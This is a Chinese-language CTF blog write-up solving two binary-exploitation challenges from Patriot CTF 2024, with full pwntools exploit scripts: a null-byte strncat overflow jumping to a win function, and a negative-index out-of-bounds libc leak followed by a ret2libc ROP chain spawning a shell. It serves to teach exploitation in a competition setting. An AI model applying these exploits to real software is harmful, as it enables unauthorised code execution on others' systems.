---
title: Patriot ctf 2024 pwn 部分 writes up
published: 2024-10-03
tags: [CTF]
category: Cyber Security
draft: false
image: 'image.png'
---


## 前言:

最近終於把備審做完ㄌ，可以開心打 CTF ㄌ，不過這一場結束的時間剛好是我備審做完的時間，所以決定來寫賽後的 pwn 題 owob。

## pwn

### Not So Shrimple Is It

#### Recon

file:

![image](https://hackmd.io/_uploads/r1eW538AA.png)

checksec:

![image](https://hackmd.io/_uploads/SJ_CF2UR0.png)


#### view-source:

題目沒有給 c 讓你分析，所以就拿出我們最好用的 ida : D

main:

![image](https://hackmd.io/_uploads/rk9WohL00.png)

shrimple:

![image](https://hackmd.io/_uploads/HkI7i2UCR.png)

#### Explain

發現題目先讓我們輸入一個字元 s ，然後將 s 的內容透過 `strcpy` 複製到 dest 上，再用 `strncat` 連接在一起。

`b'\x00'` 會變成 `00 0a`

strncats 只要碰到 `00` 就會停止

> r.sendlineafter(b'>>',b'a'*43+b'\x00')

```py
[DEBUG] Sent 0x2d bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  61 61 61 61  61 61 61 00  0a           │aaaa│aaaa│aaa·│·│

```

這樣可以拿來幹嘛呢?

假設今天題目有一個 target (win 的地方 ) ，並且沒有開啟 PIE，那會是 3 個 bytes 像是

```python=
0x0040127d    7    119 sym.shrimp
0x00401400    4    101 sym.__libc_csu_init
0x00401180    1      5 sym._dl_relocate_static_pie
0x004012f4    4    254 main
0x00401000    3     27 sym._init
```

而 libc (經過 ALSR)會發現有 6 bytes 。



```python=
pwndbg> stack 20
00:0000│ rsp       0x7fffffffddb0 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
... ↓              2 skipped
03:0018│-068       0x7fffffffddc8 ◂— 'aaaaaaa\n'
04:0020│ rsi       0x7fffffffddd0 —▸ 0x400000 ◂— 0x10102464c457f
05:0028│-058       0x7fffffffddd8 —▸ 0x7ffff7fe283c (_dl_sysdep_start+1020) ◂— mov rax, qword ptr [rsp + 0x58]
06:0030│-050       0x7fffffffdde0 ◂— 0x6f0
07:0038│-048       0x7fffffffdde8 —▸ 0x7fffffffe2a9 ◂— 0x9c8783a3215bf9ab
08:0040│ rax r9    0x7fffffffddf0 ◂— 'so easy and so shrimple, have fun!aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
09:0048│-038       0x7fffffffddf8 ◂— 'and so shrimple, have fun!aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
0a:0050│-030       0x7fffffffde00 ◂— 'hrimple, have fun!aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
0b:0058│-028       0x7fffffffde08 ◂— ' have fun!aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
0c:0060│-020       0x7fffffffde10 ◂— 'n!aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
0d:0068│-018       0x7fffffffde18 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaa\n'
... ↓              2 skipped
10:0080│ rbp rdi-2 0x7fffffffde30 ◂— 0xa61 /* 'a\n' */
11:0088│+008       0x7fffffffde38 —▸ 0x7ffff7c29d90 (__libc_start_call_main+128) ◂— mov edi, eax
12:0090│+010       0x7fffffffde40 —▸ 0x7ffff7e17600 (_IO_file_jumps) ◂— 0
13:0098│+018       0x7fffffffde48 —▸ 0x4012f4 (main) ◂— endbr64 
```

而我們需要利用 libc 去推算出 target 就需要利用 00，因為 00 可以導致 libc 的最高位元被消成 00



> 0xa0061616161 -> 0xa00616161 -> 0xa006161

![image](https://hackmd.io/_uploads/SJJIA2IAA.png)

![image](https://hackmd.io/_uploads/BysD03I00.png)

![image](https://hackmd.io/_uploads/S1-503I0A.png)

![image](https://hackmd.io/_uploads/SkshR3ICA.png)

![image](https://hackmd.io/_uploads/Hy01y6L0C.png)


#### exploit

```py
from pwn import *

context.arch='amd64'

#r=process('./shrimple')
r=remote('chal.competitivecyber.club',8884)

DEBUG=input('Debug:y/n'+'\n')

if DEBUG=="y":
    context.log_level = 'debug'
    context.arch = 'amd64'
    context.os = 'linux'
    context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
def p():
    gdb.attach(r)

win=p64(0x0040127d+0x5)


r.sendlineafter(b'>>',b'a'*43+b'\x00')

#p()

r.sendlineafter(b'>>',b'a'*42+b'\x00')

p()

r.sendlineafter(b'>>',b'a'*38+win)

r.interactive()

```

#### pwned!

![image](https://hackmd.io/_uploads/HkO1ChIAC.png)


### Navigator

#### Recon

file:

![image](https://hackmd.io/_uploads/SkE631O0A.png)



checksec:

![image](https://hackmd.io/_uploads/rJH2hJdCC.png)

#### view-source:

題目沒有給 c 讓你分析，所以就拿出我們最好用的 ida : D

main:

![image](https://hackmd.io/_uploads/Sy5sayOCR.png)

viewPin:

![image](https://hackmd.io/_uploads/HkkApJuAA.png)


setPin:

![image](https://hackmd.io/_uploads/r1_ap1_CR.png)


menu:

![image](https://hackmd.io/_uploads/H1C26yOA0.png)

#### get libc

在解這一題的時候發現有一個雷點是 libc 方面的問題，所以這邊寫一下怎麼偷 libc xD 

先把 docker build 起來

```bash=
docker build -i -t <name> .

```

看看 docker images 有哪些
```bash=
docker images

REPOSITORY                   TAG                              IMAGE ID       CREATED         SIZE
roderickchan/debug_pwn_env   18.04-2.27-3ubuntu1.6-20230213   c4835e266e36   18 months ago   1.56GB

```

使用 images 執行 container

```bash=
docker run -i -t <imageid> 


下次再執行 docker
```bash=
sudo docker  exec -i -t <image id> bash
```

撈 ld & libc 檔案

```bash=
sudo docker cp <containerid>:file .
```




#### Explain

##### offset:

先從 `viewPin`這一個 function 下手，我們可以看到她讀取了一個字元輸入，然後把那個輸入轉換成數字型號，然後還有擋太大的輸入，但是他沒有擋負數的輸入，因此我們可以利用這一特性做到`oob`。

![image](https://hackmd.io/_uploads/rk9lllOA0.png)

那我們就可以利用這一個 oob 去 leak libc address 了，但是現在還有一個問題是我們不知道 offset 是多少，所以就打開萬用工具 gdb 讓他跑起來分析ㄅ，

在 viewPin 的 fgets 那一邊下一個斷點

![image](https://hackmd.io/_uploads/BJ47Iru0C.png)

然後 ni 進去 fgets 裡面並且輸入負數

![image](https://hackmd.io/_uploads/HJBkDH_AC.png)


stack 20 

![image](https://hackmd.io/_uploads/H1LdISuRA.png)


vmmap 看一下 libc 的位置

![image](https://hackmd.io/_uploads/rJL58Sd0C.png)

之後就是 x/??gx -0x?? 大法看哪一個數值跟 libc 有對上，然後值得注意的點是我們可以用 stack 20 上面的 address 去看陣列的頭在哪裡，並且透過那邊去計算 offset，然後 libc leak 出來的 libc address通常會是 0x70~0x7f。

下面是一張超醜ㄉ概念圖 owob

![image](https://hackmd.io/_uploads/Sy4kzA80A.png)

###### ret2libc

原本想要串 ROP Chain，但 ROPgadget 丟下去之後發現根本沒有啥 gadget 可以用 QQ，於是決定鬼轉 retlibc。

![image](https://hackmd.io/_uploads/r1xFdr_AA.png)

然後在確保 libc 有沒有成功 leak 出來的時候建議直接 attach 到 leak 的地方，不然會卡超久= =

![image](https://hackmd.io/_uploads/HkFg9BO0C.png)

![image](https://hackmd.io/_uploads/r1-b9r_0R.png)

##### write data:

leak 完 libc 之後，我們就要開始想辦法把 gadgets 都寫到程式上，這邊還有一個問題點是不知道要從哪裡開始寫，於是就開了 gdb 跑起來分析。

先在 setPin 的兩個 fgets 跟 ret 下斷點，分別輸入 200 跟 a 接著 c 過去 ret 的位置，接著用 stack 60 去看 stack 的狀態

![image](https://hackmd.io/_uploads/SJoPe3i0A.png)

![image](https://hackmd.io/_uploads/B17Rx3s0C.png)

會發現程式從 0xfff...de90 開始寫資料進去陣列裡面，然後最後 ret 到 main 的 0xfff...dde8 ret (mov edi,eax)，用這兩個數值去相減就會求出 offset ㄌ。

如果不太清楚為啥 mov edi,eax 那邊是 main func 的 ret 的話，其實可以在 main 對他的 fgets 跟 ret 下斷點，觀察之後就會發現數值一模一樣ㄌ。最後在寫 exploit 的時候要注意一下 ret 的值沒有被吃到，所以要送一個 quit 讓他被吃到w

![image](https://hackmd.io/_uploads/Hkii-3sAR.png)

#### final exploit

```python=
from pwn import *

context.arch='amd64'

r=process('./navigator_patched')

DEBUG=input('Debug:y/n'+'\n')

if DEBUG=="y":
   context.log_level = 'debug'
   context.terminal = ['tmux', 'splitw', '-h']

def p():
    gdb.attach(r)

def set_pin(index,alphabet):
	r.sendlineafter(b'>>',b'1')
	r.sendlineafter(b'>>',str(index).encode())
	r.sendlineafter(b'>>',alphabet)
	
def view_pin(index):
	r.sendlineafter(b'>>',b'2')
	r.sendlineafter(b'>>',str(index).encode())

def libc(index):
	temp=b''
	for i in range(0,8):
		r.sendlineafter(b'>>',b'2')
		r.sendlineafter(b'>>',str(index+i).encode())
		r.recvline(2)
		temp+=r.recv(1)
	return hex(u64(temp))	

leak=int(libc(-8*17),16)

print('leak libc:',hex(leak))
print('==========')

libc_base=leak-0x43654

print('libc_base',hex(libc_base))
print('===========')

pop_rdi=0x000000000002a3e5+libc_base
bin_sh=0x00000000001d8678+libc_base
system=0x00050d70+libc_base

ROPchain=p64(pop_rdi)+p64(bin_sh)+p64(pop_rdi+0x1)+p64(system)
ROPchain=bytearray(ROPchain)

#print(len(ROPchain))


for i in range(len(ROPchain)):
	set_pin(344+i,ROPchain[i:i+1])

p()

#r.sendline(b'3')

r.interactive()
```

#### pwned!

![image](https://hackmd.io/_uploads/r1n8zhjAC.png)
